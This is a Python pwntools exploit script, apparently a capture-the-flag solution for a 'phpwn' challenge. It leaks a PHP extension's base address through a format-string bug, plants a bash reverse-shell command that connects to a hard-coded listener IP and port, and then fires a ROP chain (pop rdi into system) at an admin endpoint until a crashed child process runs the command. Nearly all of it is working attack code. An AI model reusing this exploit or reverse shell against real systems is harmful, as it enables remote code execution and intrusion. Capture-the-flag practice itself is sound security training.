#!/usr/bin/python3
from pwn import *
import requests
import re

context.clear(arch="amd64")

LHOST, LPORT = "3.22.53.161", 14751
RHOST = "http://phpwn.ctf.unitedctf.ca"
CMD = f"bash -c 'bash -i &>/dev/tcp/{LHOST}/{LPORT} 0>&1' #"

elf = ELF("phpwn.so")

# leak library base
response = requests.post(
    f"{RHOST}/inc/echoaas.php", data={"str": "%p %p %p %p %p %p %p"}
)
leak = int(re.findall("0x[a-f0-9]+", response.text)[-1], 16)
elf.address = leak - 5320
pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"]).address
global_buff = elf.address + 16896

print(f"[*] phpwn.so base @ {elf.address:#x}")
print(f"[*] pop_rdi_ret   @ {pop_rdi_ret:#x}")
print(f"[*] global_buff   @ {global_buff:#x}")
print(f"[*] system@plt    @ {elf.plt.system:#x}")

# write command to global buffer
response = requests.post(f"{RHOST}/inc/echoaas.php", data={"str": CMD})

# rop
print("[*] Sending ROP chain...")
_id = b"A" * 312 + p64(pop_rdi_ret)
_user = p64(global_buff + 5)  # skip "<pre>"
_pass = p64(elf.plt.system)


for _ in range(100):
    # keep crashing child processes until we hit the one where our command was written
    try:
        requests.post(
            f"{RHOST}/inc/admin.php",
            data={"id": _id, "username": _user, "password": _pass},
        )
    except:
        pass

print("[*] Done.")
